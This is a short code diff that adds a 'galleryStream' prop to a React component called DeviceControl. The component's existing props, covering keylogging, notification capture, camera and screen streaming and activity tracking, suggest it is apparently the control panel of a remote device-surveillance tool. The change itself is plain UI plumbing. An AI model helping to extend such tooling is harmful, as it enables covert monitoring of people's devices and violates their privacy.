@@ -50,7 +50,7 @@ export default function DeviceControl({
   device, sendCommand, results, pending, onBack,
   streamFrame, cameraFrame, send, keylogPushEntries, notifPushEntries,
   activityAppEntries, screenReaderPushData, offlineRecordingVersion,
-  serverLatency, deviceLatency, gcodeVersion,
+  serverLatency, deviceLatency, gcodeVersion, galleryStream,
 }) {
   const [activeTab, setActiveTab]     = useState('control_center');
   const [refreshKeys, setRefreshKeys] = useState(initialRefreshKeys);
@@ -281,6 +281,7 @@ export default function DeviceControl({
           device={device}
           sendCommand={sendCommand}
           results={results}
+          galleryStream={galleryStream}
         />
       </div>
 
